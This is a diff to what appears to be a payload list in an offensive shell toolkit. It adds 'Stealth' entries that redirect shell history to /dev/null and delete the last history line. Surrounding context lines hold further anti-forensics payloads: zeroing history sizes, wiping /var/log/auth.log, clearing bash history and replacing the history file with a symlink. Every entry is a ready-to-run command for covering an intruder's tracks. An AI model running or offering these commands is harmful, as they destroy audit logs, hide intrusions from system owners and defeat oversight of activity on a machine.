@@ -199,12 +199,13 @@ Load({
 
 Load({ payload: "export HISTSIZE=0", desc: "Change history file length to 0", category: "Stealth"})
 Load({ payload: "export HISTFILESIZE=0", desc: "Change history file length to 0", category: "Stealth"})
+Load({ payload: "export HISTFILE=/dev/null", desc: "Point history file to /dev/null", category: "Stealth"})
 Load({ payload: "export HISTCONTROL=ignorespace", desc: "Ignore commands preceded with a space", category: "Stealth"})
+Load({ payload: "export HISTCONTROL=ignorespace && HLEN=$(history | wc -l) && history -d $HLEN", desc: "Ignore commands preceded with a space and delete last entry in history", category: "Stealth"})
 Load({ payload: "echo \"\" > /var/log/auth.log", desc: "Clear auth.log", category: "Stealth"})
 Load({ payload: "history -c", desc: "Clear bash history", category: "Stealth"})
 Load({ payload: "touch ~/.bash_history", desc: "Clear bash history", category: "Stealth"})
 Load({ payload: "rm -rf ~/.bash_history && ln -s ~/.bash_history /dev/null", desc:"Permanently remove bash history", category:"Stealth"})
-
 
 /*
 ######################################################
